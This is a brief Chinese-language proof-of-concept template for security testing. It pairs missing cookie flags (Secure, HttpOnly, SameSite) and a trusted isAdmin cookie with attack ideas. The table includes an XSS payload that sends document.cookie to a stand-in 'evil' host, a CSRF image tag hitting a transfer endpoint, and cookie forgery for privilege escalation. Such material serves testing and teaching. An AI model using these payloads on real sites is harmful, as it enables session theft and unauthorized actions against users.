# Cookie & Trust Boundary Family（Insecure Cookie / Trust Boundary Violation）

## PoC 模板

| 弱点 | 攻击思路 |
|---|---|
| 无 Secure | 中间人在 HTTP 链路嗅探 Cookie (公共 WiFi / 同子网 ARP 攻击) |
| 无 HttpOnly | 配合 XSS：`<script>fetch('//evil/?'+document.cookie)</script>` |
| 无 SameSite | CSRF：诱导受害者访问 `<img src="https://victim.com/api/transfer?...">` |
| Trust Boundary | 把 `Cookie["isAdmin"]=true` 直接信任的应用，前端伪造 Cookie 即升级权限 |
